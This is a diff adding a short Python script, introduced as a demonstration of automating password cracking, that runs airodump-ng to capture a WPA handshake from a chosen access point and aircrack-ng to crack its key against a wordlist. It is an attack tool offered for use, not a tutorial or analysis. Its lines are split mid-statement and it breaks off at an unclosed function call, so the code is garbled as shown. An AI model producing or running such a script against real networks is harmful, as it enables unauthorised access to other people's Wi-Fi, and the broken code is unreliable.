@@ -1,0 +1,58 @@
+// Here's a script that demonstrates how you might use Python to automate the
+password cracking process using aircrack-ng
+
+
+import subprocess
+
+import os
+
+def capture_handshake(interface, bssid, channel,
+
+output_file):
+
+    print(f"Capturing handshake for {bssid} on channel
+
+{channel}")
+
+    cmd = f"airodump-ng -c {channel} --bssid {bssid} -w
+
+{output_file} {interface}"
+
+    subprocess.run(cmd, shell=True)
+
+def crack_password(handshake_file, wordlist):
+
+    print("Attempting to crack password...")
+
+    cmd = f"aircrack-ng {handshake_file} -w {wordlist}"
+
+    result = subprocess.run(cmd, shell=True,
+
+capture_output=True, text=True)
+
+    
+
+    if "KEY FOUND" in result.stdout:
+
+        password = result.stdout.split("KEY FOUND! [ ")
+
+[1].split(" ]")[0]
+
+        print(f"Password cracked: {password}")
+
+    else:
+
+        print("Password not found in wordlist")
+
+# Example usage
+
+interface = "wlan0mon"
+
+bssid = "00:11:22:33:44:55"
+
+channel = 6
+
+output_file = "capture"
+wordlist = "/path/to/wordlist.txt"
+
+capture_handshake(interface, bssid, channel, output_file
